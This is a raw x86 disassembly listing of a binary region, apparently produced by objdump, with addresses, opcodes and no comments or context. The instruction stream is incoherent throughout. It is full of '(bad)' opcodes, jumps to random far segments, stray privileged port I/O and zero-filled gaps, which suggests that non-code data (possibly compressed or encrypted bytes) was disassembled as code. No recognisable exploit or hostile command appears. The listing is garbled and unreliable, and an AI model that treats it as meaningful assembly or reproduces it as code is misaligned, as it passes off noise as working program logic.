  425a7d:	fimul  DWORD PTR [edi+eax*4+0x375b9a3d]
  425a84:	lea    edx,[edx+0x1050001]
  425a8a:	add    BYTE PTR [eax],al
  425a8c:	and    BYTE PTR [eax+0x6c],ch
  425a8f:	pop    ebx
  425a90:	jg     0x425acc
  425a92:	cwde   
  425a93:	mov    eax,ds:0x74fb0f99
  425a98:	add    dh,bh
  425a9a:	add    al,0x4d
  425a9c:	data16 mov bl,0xea
  425a9f:	jmp    0x425aec
  425aa1:	mov    eax,DWORD PTR [esi+0x51]
  425aa4:	loope  0x425a3c
  425aa6:	cwde   
  425aa7:	pop    ebp
  425aa8:	inc    DWORD PTR [esi-0x7d]
  425aab:	mov    al,ds:0xe6effc9c
  425ab0:	imul   ebp,DWORD PTR [edi-0x9],0xffffffda
  425ab4:	sub    DWORD PTR [ecx-0x4973b438],edx
  425aba:	mov    eax,ds:0x9bc538a9
  425abf:	mov    DWORD PTR [eax],0x60432b3d
  425ac5:	test   BYTE PTR [esi-0x1f],ah
  425ac8:	int    0x4c
  425aca:	pop    esp
  425acb:	adc    esp,esi
  425acd:	pop    esi
  425ace:	sbb    BYTE PTR [edi+0x3c6a74aa],cl
  425ad4:	jnp    0x425b06
  425ad6:	xchg   ebp,eax
  425ad7:	or     eax,0x4383bd6e
  425adc:	jmp    0x425b4d
  425ade:	push   0xffffffff
  425ae0:	lea    esi,[esi-0x42faa1c3]
  425ae6:	test   BYTE PTR [ebp+0x105db636],ch
  425aec:	sahf   
  425aed:	pop    edx
  425aee:	ds scas eax,DWORD PTR es:[edi]
  425af0:	mov    ch,0xd4
  425af2:	sbb    bl,BYTE PTR [esi+0xa]
  425af5:	cs inc ebp
  425af7:	fdiv   st(2),st
  425af9:	adc    BYTE PTR [esi+esi*2],0x6d
  425afd:	mov    ch,0x7a
  425aff:	pop    cx
  425b01:	push   es
  425b02:	jecxz  0x425b51
  425b04:	add    ebp,DWORD PTR [ecx-0x8da8b15]
  425b0a:	push   ebx
  425b0b:	lods   eax,DWORD PTR ds:[esi]
  425b0c:	shr    BYTE PTR [edx+0x764e2fea],1
  425b12:	je     0x425a97
  425b14:	aas    
  425b15:	push   ecx
  425b16:	sbb    al,0xd6
  425b18:	push   ebp
  425b19:	lea    eax,ds:0xd050af0d
  425b1f:	jge    0x425ae6
  425b21:	inc    eax
  425b22:	outs   dx,DWORD PTR ds:[esi]
  425b23:	adc    bh,ch
  425b25:	clc    
  425b26:	(bad)  
  425b27:	push   edi
  425b28:	in     eax,dx
  425b29:	(bad)  
  425b2a:	outs   dx,BYTE PTR ss:[esi]
  425b2c:	stos   DWORD PTR es:[edi],eax
  425b2d:	fwait
  425b2e:	out    dx,al
  425b2f:	in     eax,0x8
  425b31:	mov    bh,0xe5
  425b33:	popa   
  425b34:	mov    BYTE PTR ds:0x8d9b30ee,ch
  425b3a:	mov    DWORD PTR cs:[ebp+eax*2-0x5d],ecx
  425b3f:	push   ebx
  425b40:	lds    esp,FWORD PTR [edi-0x2484f00d]
  425b46:	pop    esi
  425b47:	loopne 0x425b76
  425b49:	and    BYTE PTR [edx-0x523443a2],ch
  425b4f:	inc    ecx
  425b50:	cmp    BYTE PTR [esi+0x32966156],ch
  425b56:	enter  0x6690,0x50
  425b5a:	cmp    DWORD PTR [ecx+0x39],ecx
  425b5d:	adc    eax,0x2b79232b
  425b62:	add    esi,DWORD PTR [eax]
  425b64:	retf   0x4019
  425b67:	or     DWORD PTR [edx+0x16dbcb54],0x6f
  425b6e:	in     al,dx
  425b6f:	out    0xef,al
  425b71:	mov    bh,0x37
  425b73:	mov    esp,0xe84276e8
  425b78:	push   edx
  425b79:	or     al,0xc1
  425b7b:	mov    BYTE PTR [ecx+0x51],cl
  425b7e:	pop    ds
  425b7f:	pop    ebx
  425b80:	and    DWORD PTR ds:0x1cdd5c94,edx
  425b86:	xchg   eax,edi
  425b88:	cmp    BYTE PTR [esi],ch
  425b8a:	int3   
  425b8b:	out    0x3d,eax
  425b8d:	and    BYTE PTR [edx],al
  425b8f:	mov    dh,0xb5
	...
  425bf1:	add    BYTE PTR [eax],al
  425bf3:	add    ah,al
  425bf5:	clc    
  425bf6:	jnp    0x425c4e
  425bf8:	jg     0x425bd1
  425bfa:	in     eax,dx
  425bfb:	cli    
  425bfc:	enter  0xe6cd,0x96
  425c00:	xchg   ecx,eax
  425c01:	add    al,0x42
  425c03:	cld    
  425c04:	xchg   edx,eax
  425c05:	xchg   ebx,eax
  425c06:	add    DWORD PTR [eax],eax
  425c08:	add    eax,0xe4000001
  425c0d:	sbb    eax,0x3fe34f04
  425c12:	icebp  
  425c13:	or     bl,cl
  425c15:	sbb    bl,BYTE PTR [esi+eax*2]
  425c18:	jp     0x425c6a
  425c1a:	dec    edx
  425c1b:	mov    ebx,ds
  425c1d:	sbb    BYTE PTR ds:0x72bdabcf,bl
  425c23:	test   BYTE PTR [ecx-0x3a2adb1b],0x9d
  425c2a:	stos   BYTE PTR es:[edi],al
  425c2b:	add    bl,BYTE PTR [ebp+0x57]
  425c2e:	mul    DWORD PTR [ebx]
  425c30:	adc    DWORD PTR [edx-0x45],eax
  425c33:	dec    eax
  425c34:	and    ebp,DWORD PTR [ebp-0x6f46ddb6]
  425c3a:	loopne 0x425c88
  425c3c:	loope  0x425c15
  425c3e:	xchg   edx,eax
  425c3f:	test   BYTE PTR ds:0x2a005c2b,al
  425c45:	xor    DWORD PTR [edi+0x25],0xfffffff5
  425c49:	adc    BYTE PTR [edx+0x37],ah
  425c4c:	cmp    DWORD PTR [eax-0x52],edx
  425c4f:	inc    ebp
  425c50:	jp     0x425c89
  425c52:	daa    
  425c53:	xchg   esi,eax
  425c54:	pop    es
  425c55:	jns    0x425bea
  425c57:	(bad)  
  425c58:	fistp  QWORD PTR [edi+0x4c]
  425c5b:	lock ficomp DWORD PTR [ecx+0x27a7f4f6]
  425c62:	mov    esi,fs
  425c64:	ds push ecx
  425c66:	daa    
  425c67:	and    BYTE PTR [ebx],0xfd
  425c6a:	jle    0x425c74
  425c6c:	fistp  DWORD PTR [edi]
  425c6e:	aaa    
  425c6f:	push   ebx
  425c70:	add    cl,BYTE PTR [eax-0x520e946b]
  425c76:	fwait
  425c77:	pop    ecx
  425c78:	mov    al,BYTE PTR [esi]
  425c7a:	add    DWORD PTR ds:[ecx],edx
  425c7d:	xchg   ebx,eax
  425c7e:	retf   0x10fa
  425c81:	jg     0x425c8f
  425c83:	mov    ecx,DWORD PTR [ecx]
  425c85:	loopne 0x425c7a
  425c87:	jb     0x425cd2
  425c89:	pop    ds
  425c8a:	push   cs
  425c8b:	pop    edi
  425c8c:	mov    ecx,0xfdb672f8
  425c91:	inc    edi
  425c92:	push   ecx
  425c93:	push   ecx
  425c94:	out    dx,al
  425c95:	sub    eax,ebp
  425c97:	cmp    eax,0xda03ebdc
  425c9c:	mov    edx,0x4308fd5e
  425ca1:	ror    eax,cl
  425ca3:	mov    fs,WORD PTR [ebx-0x4e7958e1]
  425ca9:	jmp    0x425d25
  425cab:	sar    BYTE PTR [ecx],0x1d
  425cae:	pop    eax
  425caf:	lock (bad) 
  425cb1:	sub    ebx,esp
  425cb3:	mov    cl,0xc0
  425cb5:	nop
  425cb6:	mov    bh,0xfe
  425cb8:	add    dh,bl
  425cba:	jbe    0x425cb5
  425cbc:	cdq    
  425cbd:	mov    dh,0x6e
  425cbf:	jge    0x425c51
  425cc1:	dec    esp
  425cc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425cc3:	pop    eax
  425cc4:	ins    BYTE PTR es:[edi],dx
  425cc5:	adc    BYTE PTR [ebp-0x5b],al
  425cc8:	adc    eax,DWORD PTR [edx+0x29]
  425ccb:	mov    dl,0x3e
  425ccd:	ja     0x425cff
  425ccf:	cdq    
  425cd0:	pop    ds
  425cd1:	xchg   DWORD PTR [eax],ecx
  425cd3:	xor    ah,ah
  425cd5:	dec    BYTE PTR [ebx-0x63138b95]
  425cdb:	in     al,dx
  425cdc:	jne    0x425c86
  425cde:	pop    ebx
  425cdf:	je     0x425d5e
  425ce1:	mov    cl,0x86
  425ce3:	cmp    BYTE PTR [edi+0x30],0x17
  425ce7:	add    DWORD PTR [ebx-0x6b],ebp
  425cea:	scas   eax,DWORD PTR es:[edi]
  425ceb:	std    
  425cec:	sub    eax,0x1dd9964a
  425cf1:	adc    DWORD PTR [edi-0x27],esi
  425cf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425cf5:	mov    ds,WORD PTR [ebx]
  425cf7:	retf   0x3ab4
  425cfa:	enter  0x26d5,0xa5
  425cfe:	mov    ebx,0x604da4f
  425d03:	jge    0x425cbf
  425d05:	or     al,0xa
  425d07:	into   
  425d08:	mov    ecx,0x83e9a8bf
  425d0d:	xchg   esi,eax
  425d0e:	sub    DWORD PTR [ecx+0xfe],esi
	...
  425d74:	jmp    FWORD PTR [esp+ebx*8-0x8820f9]
  425d7b:	cld    
  425d7c:	gs addr16 stc 
  425d7f:	mov    ds:0xb1928e10,al
  425d84:	xchg   edi,eax
  425d85:	xchg   esp,eax
  425d86:	add    DWORD PTR [eax],eax
  425d88:	add    eax,0x64000001
  425d8d:	xchg   ebx,eax
  425d8e:	xlat   BYTE PTR ds:[ebx]
  425d8f:	not    DWORD PTR [edx+0x72]
  425d92:	mov    ebp,0x71beaf96
  425d97:	mov    bl,0xa
  425d99:	test   al,0xd
  425d9b:	(bad)  
  425d9c:	loopne 0x425d2b
  425d9e:	ret    0x62d
  425da1:	mov    ebp,DWORD PTR [edi+0x36]
  425da4:	adc    dh,BYTE PTR [ecx+0xc36cff4]
  425daa:	scas   eax,DWORD PTR es:[edi]
  425dab:	shl    DWORD PTR [ecx],cl
  425dad:	stc    
  425dae:	sar    BYTE PTR [edx+0x4778087],0xc5
  425db5:	xchg   esi,eax
  425db6:	sub    cl,BYTE PTR [eax+0x33944a7e]
  425dbc:	inc    eax
  425dbd:	dec    eax
  425dbe:	add    al,0x29
  425dc0:	adc    al,0x83
  425dc2:	mov    al,ds:0x549edd4c
  425dc7:	test   BYTE PTR [ebx-0x11],bh
  425dca:	cmp    al,0x57
  425dcc:	mov    al,0x60
  425dce:	pushf  
  425dcf:	mov    eax,ds:0x629da603
  425dd4:	push   cs
  425dd5:	cli    
  425dd6:	jae    0x425df8
  425dd8:	jo     0x425e2c
  425dda:	dec    ecx
  425ddb:	fisttp DWORD PTR [edi-0x3925645d]
  425de1:	ss push ebx
  425de3:	mov    bl,0x63
  425de5:	pushf  
  425de6:	jnp    0x425e1d
  425de8:	in     eax,dx
  425de9:	shl    BYTE PTR [ebp+0x2a],cl
  425dec:	cdq    
  425ded:	xor    esp,ebx
  425def:	xlat   BYTE PTR ds:[ebx]
  425df0:	out    dx,al
  425df1:	ret    0x6352
  425df4:	mov    al,ds:0xfb64a72f
  425df9:	fwait
  425dfa:	push   es
  425dfb:	lahf   
  425dfc:	mov    ds:0x94706c47,eax
  425e01:	jecxz  0x425da7
  425e03:	mov    DWORD PTR [ebp+0x5c],eax
  425e06:	(bad)  
  425e07:	call   0xbaa9:0xc9e09999
  425e0e:	cmp    bl,al
  425e10:	aaa    
  425e11:	xchg   ebx,ebp
  425e13:	mov    eax,ds:0xfbe11532
  425e18:	adc    DWORD PTR [esi+0x6b],0xffffffa2
  425e1c:	pop    esi
  425e1d:	sub    BYTE PTR ds:0x341038ff,0x3f
  425e24:	fucompp 
  425e26:	cmp    cl,dl
  425e28:	cwde   
  425e29:	imul   edi,DWORD PTR ds:0xadc8b62c,0xffffffae
  425e30:	pop    es
  425e31:	mov    edi,0x48aa6e4f
  425e36:	mov    bh,0xbf
  425e38:	aad    0xb0
  425e3a:	dec    eax
  425e3b:	out    dx,al
  425e3c:	nop
  425e3d:	xor    esp,DWORD PTR [eax+0x3b]
  425e40:	test   ecx,ebx
  425e42:	mov    DWORD PTR [edx+0x42],edi
  425e45:	mov    DWORD PTR [ebp-0x5d],ecx
  425e48:	repz lahf 
  425e4a:	mov    edx,0x6fe32d2a
  425e4f:	jnp    0x425df7
  425e51:	inc    esp
  425e52:	dec    eax
  425e53:	ret    
  425e54:	xchg   esp,eax
  425e55:	sahf   
  425e56:	icebp  
  425e57:	sub    DWORD PTR [edi],ebp
  425e59:	(bad)  
  425e5a:	das    
  425e5b:	dec    esi
  425e5c:	pop    edi
  425e5d:	mov    bl,dh
  425e5f:	rol    edx,1
  425e61:	stos   BYTE PTR es:[edi],al
  425e62:	mov    esp,0xbff727e9
  425e67:	outs   dx,BYTE PTR ds:[esi]
  425e68:	shl    edx,cl
  425e6a:	jmp    0xd21c851e
  425e6f:	lea    edx,[ebp+0x6d15bbbf]
  425e75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e76:	mov    edx,0xb7580800
  425e7b:	je     0x425e2d
  425e7d:	push   es
  425e7e:	push   ecx
  425e7f:	add    ah,ch
  425e81:	mov    ebx,0x1ac9d7a9
  425e86:	jmp    0x8d02:0x3ade41e4
  425e8d:	mov    ds:0x711b16,eax
	...
  425ef2:	add    BYTE PTR [eax],al
  425ef4:	(bad)  
  425ef5:	jl     0x425f48
  425ef7:	sar    bl,1
  425ef9:	std    
  425efa:	(bad)  
  425efb:	jle    0x425ec9
  425efd:	pop    ss
  425efe:	popf   
  425eff:	scas   eax,DWORD PTR es:[edi]
  425f00:	sti    
  425f01:	or     DWORD PTR [ebx],esp
  425f03:	rcr    DWORD PTR [ebp+edx*4+0x1050001],cl
  425f0a:	add    BYTE PTR [eax],al
  425f0c:	call   0x85b9:0x5e626319
  425f13:	retf   0x624e
  425f16:	pop    ebp
  425f17:	pushf  
  425f18:	out    dx,al
  425f19:	gs out dx,eax
  425f1b:	das    
  425f1c:	aam    0xf5
  425f1e:	shr    DWORD PTR [esi+esi*4-0x2b],0x61
  425f23:	jb     0x425f6d
  425f25:	nop
  425f26:	loopne 0x425f63
  425f28:	pop    ds
  425f29:	adc    eax,0x4e417bcb
  425f2e:	ror    ecx,cl
  425f30:	xchg   edi,eax
  425f31:	pop    ebx
  425f32:	bound  eax,QWORD PTR [edi-0x2cb71c1]
  425f38:	pop    ss
  425f39:	cs mov ch,0x5a
  425f3c:	es sahf 
  425f3e:	adc    al,0xfa
  425f40:	jmp    0xa43188d7
  425f45:	stos   BYTE PTR es:[edi],al
  425f46:	mov    BYTE PTR [ebx],0x71
  425f49:	daa    
  425f4a:	pusha  
  425f4b:	stos   BYTE PTR es:[edi],al
  425f4c:	push   ebp
  425f4d:	fist   WORD PTR [ebx+eiz*2-0x7d]
  425f51:	pop    es
  425f52:	clc    
  425f53:	es test al,0xd7
  425f56:	pop    edx
  425f57:	dec    esp
  425f58:	das    
  425f59:	adc    edx,edi
  425f5b:	bound  esp,QWORD PTR [ebx+0x2b47bc60]
  425f61:	cmp    eax,0x8d680251
  425f66:	sub    esp,DWORD PTR [eax-0xb]
  425f69:	imul   esp,DWORD PTR [esi-0x606d7a2],0x11b59a66
  425f73:	arpl   WORD PTR [esi-0x47],cx
  425f76:	cmp    edi,DWORD PTR [esi-0x6ab8d423]
  425f7c:	and    cl,ch
  425f7e:	(bad)  
  425f7f:	ss jmp 0x3cf5e250
  425f85:	ins    DWORD PTR es:[edi],dx
  425f86:	sti    
  425f87:	out    dx,al
  425f88:	sub    cl,BYTE PTR [esi+eax*8]
  425f8b:	cmp    al,BYTE PTR [edx]
  425f8d:	push   ebp
  425f8e:	pop    esi
  425f8f:	and    cl,al
  425f91:	xor    ch,BYTE PTR [eax+ebx*1-0x23]
  425f95:	mov    edi,0x5cb59bf3
  425f9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425f9b:	arpl   dx,dx
  425f9d:	inc    eax
  425f9e:	imul   esp,DWORD PTR [eax+0x3061f7fc],0x4f54a09a
  425fa8:	pusha  
  425fa9:	jmp    0x84a2:0xcb462db0
  425fb0:	add    al,0xa6
  425fb2:	pop    esi
  425fb3:	push   0xffffffd5
  425fb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425fb6:	in     eax,dx
  425fb7:	ins    DWORD PTR es:[edi],dx
  425fb8:	aad    0x1
  425fba:	ins    BYTE PTR es:[edi],dx
  425fbb:	xor    ecx,edx
  425fbd:	dec    edx
  425fbe:	pop    eax
  425fbf:	sub    al,dh
  425fc1:	push   esp
  425fc2:	inc    ecx
  425fc3:	cli    
  425fc4:	xor    eax,0x58ea4d54
  425fc9:	xchg   edx,eax
  425fca:	repnz dec edx
  425fcc:	sub    eax,0xeb9d0bc9
  425fd1:	ins    BYTE PTR es:[edi],dx
  425fd2:	mov    eax,0xe0f9f129
  425fd7:	inc    ebp
  425fd8:	sub    dl,dh
  425fda:	retf   
  425fdb:	aam    0xd9
  425fdd:	es dec esp
  425fdf:	jno    0x425fdb
  425fe1:	or     dl,BYTE PTR [ecx+0x21d7c2b7]
  425fe7:	fcom   QWORD PTR [edx+0x60]
  425fea:	lods   eax,DWORD PTR ds:[esi]
  425feb:	fisttp WORD PTR [esi]
  425fed:	or     cl,ah
  425fef:	sbb    al,0xd5
  425ff1:	or     al,0xb1
  425ff3:	xchg   esp,eax
  425ff4:	or     bl,bl
  425ff6:	cwde   
  425ff7:	push   cs
  425ff8:	inc    esp
  425ff9:	dec    ebx
  425ffa:	mov    ds:0x2f2d6ba8,al
  425fff:	pop    ebp
  426000:	pop    es
  426001:	pushf  
  426002:	pop    esi
  426003:	arpl   WORD PTR [ebp-0x172d130a],sp
  426009:	xor    DWORD PTR [ebp-0x3b],esp
  42600c:	test   al,0xa8
  42600e:	jle    0x426084
  426010:	mov    edi,0x0
	...
  426071:	add    BYTE PTR [eax],al
  426073:	add    BYTE PTR [ecx],bh
  426075:	cwde   
  426076:	or     eax,DWORD PTR [esi]
  426078:	stos   DWORD PTR es:[edi],eax
  426079:	xchg   edi,eax
  42607a:	cmp    eax,0x304575bf
  42607f:	in     al,dx
  426080:	jmp    DWORD PTR [edx-0x24]
  426083:	ret    0x96a1
  426086:	add    DWORD PTR [eax],eax
  426088:	add    eax,0x87000001
  42608d:	jae    0x4260a6
  42608f:	(bad)  
  426090:	cmp    al,0x1e
  426092:	push   esp
  426093:	retf   0x1a6c
  426096:	out    dx,eax
  426097:	frstor [edi+0x2]
  42609a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42609b:	iret   
  42609c:	xor    edi,edx
  42609e:	mov    DWORD PTR [ebx-0x11e5e08d],ecx
  4260a4:	add    BYTE PTR [edx+0x5],al
  4260a7:	out    dx,eax
  4260a8:	aam    0x3d
  4260aa:	loopne 0x4260b8
  4260ac:	pushf  
  4260ad:	call   0x1715:0x547c86ce
  4260b4:	sahf   
  4260b5:	(bad)
  4260b9:	pop    ss
  4260ba:	repz ret 0x63fe
  4260be:	popa   
  4260bf:	jb     0x426084
  4260c1:	xor    al,0x99
  4260c3:	or     DWORD PTR [esp+edx*4+0x36],ebx
  4260c7:	jmp    0xfdb4081
  4260cc:	xor    ebx,esp
  4260ce:	retf   0x422d
  4260d1:	mov    ds:0xa5542047,al
  4260d6:	add    BYTE PTR [eax-0x1b],0xd9
  4260da:	push   0x3a
  4260dc:	pop    ecx
  4260dd:	inc    edi
  4260de:	je     0x426108
  4260e0:	jo     0x42608a
  4260e2:	mov    bh,0x9d
  4260e4:	jp     0x4260c0
  4260e6:	test   eax,0xa297948c
  4260eb:	ins    DWORD PTR es:[edi],dx
  4260ec:	push   ss
  4260ed:	inc    ebp
  4260ee:	std    
  4260ef:	aam    0x28
  4260f1:	mov    ch,0x1e
  4260f3:	pop    edx
  4260f4:	fsubr  QWORD PTR [ebx+0x9]
  4260f7:	jns    0x42611f
  4260f9:	pop    edi
  4260fa:	in     al,dx
  4260fb:	inc    edi
  4260fc:	inc    esi
  4260fd:	sub    al,0xd8
  4260ff:	lds    esp,FWORD PTR ds:0xfd3f5141
  426105:	mov    esp,0x9850d388
  42610a:	dec    ecx
  42610b:	mov    ebp,0xbb19bca0
  426110:	pop    edx
  426111:	je     0x42615d
  426113:	lahf   
  426114:	push   0xf92e3533
  426119:	shr    DWORD PTR ds:0x6fa342b0,1
  42611f:	xchg   esi,eax
  426120:	cli    
  426121:	cdq    
  426122:	jo     0x426163
  426124:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426125:	and    ch,dl
  426127:	or     esp,0xfffffffc
  42612a:	fiadd  DWORD PTR [ecx+0x4c8c7c5b]
  426130:	jecxz  0x42613d
  426132:	and    ch,BYTE PTR [esi]
  426134:	sbb    edi,DWORD PTR [esi+0x3c]
  426137:	(bad)  ds:0x4de51d03
  42613d:	xor    BYTE PTR ds:0x65c833d0,0x88
  426144:	mov    esp,0xbcb35646
  426149:	std    
  42614a:	cmp    BYTE PTR cs:[ebx-0x1d],dh
  42614e:	add    eax,0xd9750edb
  426153:	inc    eax
  426154:	xchg   esp,eax
  426155:	adc    DWORD PTR [edx-0x5bce91da],eax
  42615b:	add    DWORD PTR [eax+0x6aaee11f],eax
  426161:	cmp    ah,al
  426163:	and    BYTE PTR [edi-0x1b51b13e],bl
  426169:	mov    DWORD PTR [eax+0x15],eax
  42616c:	mov    ds:0xa0f1f8ce,eax
  426171:	stos   DWORD PTR es:[edi],eax
  426172:	call   0x8ff0e932
  426177:	xchg   DWORD PTR [esi],ecx
  426179:	pop    esp
  42617a:	clc    
  42617b:	jb     0x4260ff
  42617d:	xchg   edi,eax
  42617e:	(bad)  
  42617f:	sbb    BYTE PTR [esp+ebx*8-0x2a],dl
  426183:	fld    TBYTE PTR [edi+0x2b]
  426186:	inc    esp
  426187:	ds jmp 0x3103:0x8aad6c29
  42618f:	push   es
  426190:	aas    
	...
  4261f1:	add    BYTE PTR [eax],al
  4261f3:	add    BYTE PTR [ebx-0x409ef0df],bl
  4261f9:	outs   dx,DWORD PTR ds:[esi]
  4261fa:	(bad)  
  4261fb:	sti    
  4261fc:	mov    bh,0x83
  4261fe:	mov    cl,0x27
  426200:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426201:	test   BYTE PTR [ebp+0x19],0xa6
  426205:	xchg   edi,eax
  426206:	add    DWORD PTR [eax],eax
  426208:	add    eax,0x38000001
  42620d:	fstp   st(4)
  42620f:	neg    DWORD PTR [edi-0x1de2649e]
  426215:	xor    DWORD PTR [edx+0x16aae43],0xffffff9b
  42621c:	addr16 jp 0x426209
  42621f:	mov    edi,0x79087cb
  426224:	std    
  426225:	and    DWORD PTR [ebp-0x76],edx
  426228:	lods   al,BYTE PTR ds:[esi]
  426229:	cdq    
  42622a:	sar    BYTE PTR [ebp+0x78c1d1e0],1
  426230:	scas   eax,DWORD PTR es:[edi]
  426231:	and    BYTE PTR [eax],0x76
  426234:	jae    0x4261dc
  426236:	ret    0x75d0
  426239:	pop    edi
  42623a:	inc    esp
  42623b:	hlt    
  42623c:	dec    BYTE PTR [edi]
  42623e:	into   
  42623f:	add    BYTE PTR [ebx+eiz*1-0x3],dh
  426243:	out    0x8b,eax
  426245:	jmp    0x91d0:0x40e9f224
  42624c:	popf   
  42624d:	mov    esp,0xc4a2315c
  426252:	les    edi,FWORD PTR [ecx-0x259eb2a6]
  426258:	and    BYTE PTR [ebx],dh
  42625a:	jno    0x4261e6
  42625c:	jp     0x426273
  42625e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42625f:	mov    ecx,0x1818c434
  426264:	in     eax,dx
  426265:	cmp    eax,0x7d0eb95b
  42626a:	ret    
  42626b:	cs xchg ebp,eax
  42626d:	lahf   
  42626e:	int    0xd9
  426270:	out    0x7,eax
  426272:	cld    
  426273:	sbb    dl,BYTE PTR [edi]
  426275:	sub    al,0x7f
  426277:	ret    0x36df
  42627a:	xor    edx,ebx
  42627c:	das    
  42627d:	ins    DWORD PTR es:[edi],dx
  42627e:	push   ds
  42627f:	inc    ecx
  426280:	mov    eax,0x23712efc
  426285:	add    ebx,DWORD PTR [ebx]
  426287:	mov    edi,0x1a10eb7f
  42628c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42628d:	and    BYTE PTR [eax+0x72509a16],ah
  426293:	xlat   BYTE PTR ds:[ebx]
  426294:	mov    eax,ds:0x8dfb300c
  426299:	ror    BYTE PTR [edx],1
  42629b:	cmp    ebx,DWORD PTR [ebx]
  42629d:	lds    eax,FWORD PTR [eax]
  42629f:	std    
  4262a0:	xor    ebp,ebp
  4262a2:	mov    eax,ds:0xff045b54
  4262a7:	push   esp
  4262a8:	pop    ebp
  4262a9:	jmp    DWORD PTR [ecx]
  4262ab:	icebp  
  4262ac:	jle    0x426280
  4262ae:	pop    esi
  4262af:	push   cs
  4262b0:	cwde   
  4262b1:	div    DWORD PTR [edx+0xe]
  4262b4:	add    ah,dh
  4262b6:	(bad)  
  4262b7:	jg     0x42623f
  4262b9:	or     cl,BYTE PTR [eax-0x230d3d36]
  4262bf:	es pop ebp
  4262c1:	push   edx
  4262c2:	jne    0x42627f
  4262c4:	(bad)  
  4262c5:	arpl   si,di
  4262c7:	xchg   ebx,eax
  4262c8:	mov    eax,ds:0x582b92e6
  4262cd:	xor    cl,BYTE PTR [esi-0x2c0826f3]
  4262d3:	in     al,dx
  4262d4:	sti    
  4262d5:	hlt    
  4262d6:	(bad)  
  4262d7:	shr    BYTE PTR [eax+edx*4-0x1d93cd62],1
  4262de:	les    ebp,FWORD PTR [eax-0x5a5f08be]
  4262e4:	leave  
  4262e5:	jmp    0xab36:0xc1aea4fa
  4262ec:	dec    ebx
  4262ed:	dec    eax
  4262ee:	push   esi
  4262ef:	push   0xffffffa7
  4262f1:	ror    BYTE PTR [ebp-0x71366ca0],cl
  4262f7:	(bad)  
  4262f8:	data16 fild WORD PTR [edi]
  4262fb:	dec    esp
  4262fc:	(bad)  
  4262fd:	sub    BYTE PTR [ecx-0x1d],bh
  426300:	mov    esi,0xc81e2b87
  426305:	adc    BYTE PTR [edx+eax*2],bh
  426308:	dec    edi
  426309:	rcr    BYTE PTR [ebx-0x62],cl
  42630c:	dec    ecx
  42630d:	fs lock xchg edi,eax
  426310:	inc    edi
	...
  426371:	add    BYTE PTR [eax],al
  426373:	add    BYTE PTR [ebp+eiz*1-0x73],dl
  426377:	dec    esi
  426378:	std    
  426379:	out    dx,al
  42637a:	xlat   BYTE PTR ds:[ebx]
  42637b:	aas    
  42637c:	dec    ecx
  42637d:	sbb    esi,edi
  42637f:	or     eax,0xf2579d15
  426384:	stos   DWORD PTR es:[edi],eax
  426385:	cwde   
  426386:	add    DWORD PTR [eax],eax
  426388:	add    eax,0xc000001
  42638d:	push   ss
  42638e:	mov    ecx,0x2fbe1f82
  426393:	mov    ecx,0xe2747f8d
  426398:	mov    edi,0x87412aff
  42639d:	add    DWORD PTR [edi+0x32],0xeefa3e3
  4263a4:	cmc    
  4263a5:	jmp    0x4263d0
  4263a7:	xchg   edi,eax
  4263a8:	outs   dx,DWORD PTR gs:[esi]
  4263aa:	imul   esi,DWORD PTR [edx],0xffffffd8
  4263ad:	scas   al,BYTE PTR es:[edi]
  4263ae:	push   eax
  4263af:	sar    BYTE PTR gs:[edx-0x2b0834c4],1
  4263b6:	pop    ss
  4263b7:	sub    eax,0xa2ae03d0
  4263bc:	sbb    esp,DWORD PTR [edx-0x66]
  4263bf:	mov    ds:0xe486741b,eax
  4263c4:	xchg   ecx,eax
  4263c5:	pushf  
  4263c6:	pushf  
  4263c7:	daa    
  4263c8:	iret   
  4263c9:	call   ebp
  4263cb:	scas   eax,DWORD PTR es:[edi]
  4263cc:	fcomp  st(6)
  4263ce:	dec    esi
  4263cf:	mov    edx,0x3e43f690
  4263d4:	outs   dx,DWORD PTR ds:[esi]
  4263d5:	(bad)  
  4263d6:	into   
  4263d7:	cdq    
  4263d8:	mov    ebx,0xc574a387
  4263dd:	inc    edx
  4263de:	add    bl,BYTE PTR [eax+0x38619d0b]
  4263e4:	shl    BYTE PTR [ecx],0x8
  4263e7:	jg     0x42644f
  4263e9:	inc    BYTE PTR [ecx-0x1b]
  4263ec:	add    dh,BYTE PTR [ebp-0x62]
  4263ef:	xlat   BYTE PTR ds:[ebx]
  4263f0:	iret   
  4263f1:	cdq    
  4263f2:	scas   eax,DWORD PTR es:[edi]
  4263f3:	dec    ecx
  4263f4:	rcr    BYTE PTR [esi-0x65],0x39
  4263f8:	das    
  4263f9:	frstor [ecx-0x27]
  4263fc:	bound  edi,QWORD PTR [eax]
  4263fe:	xor    ch,BYTE PTR ds:0x93fb769a
  426404:	pop    ds
  426405:	sbb    DWORD PTR [eax+0x65],ebp
  426408:	push   ecx
  426409:	pop    edi
  42640a:	push   ecx
  42640b:	push   ecx
  42640c:	adc    al,0xe8
  42640e:	push   esp
  42640f:	test   eax,0xd7a825
  426414:	jbe    0x4263a2
  426416:	mov    esp,0x2b13bc67
  42641b:	jb     0x426442
  42641d:	stc    
  42641e:	adc    ah,BYTE PTR [eax-0x28]
  426421:	dec    ebp
  426422:	push   ss
  426423:	cwde   
  426424:	xchg   esp,eax
  426425:	sub    bl,al
  426427:	sub    al,0x8e
  426429:	sub    esi,ebx
  42642b:	add    dl,cl
  42642d:	pop    ebp
  42642e:	fs mov cl,0x79
  426431:	fidiv  DWORD PTR [ebp+0x2]
  426434:	or     DWORD PTR [edi+esi*8],ebx
  426437:	imul   esp,DWORD PTR [edi-0x6f],0x3a715d28
  42643e:	cs pop ss
  426440:	dec    edx
  426441:	jo     0x4263cb
  426443:	mov    dl,0xee
  426445:	lock setg BYTE PTR [edi+ebx*4-0x5def9656]
  42644e:	push   eax
  42644f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426450:	and    ebx,0x3ebb1161
  426456:	stos   DWORD PTR es:[edi],eax
  426457:	xchg   ecx,eax
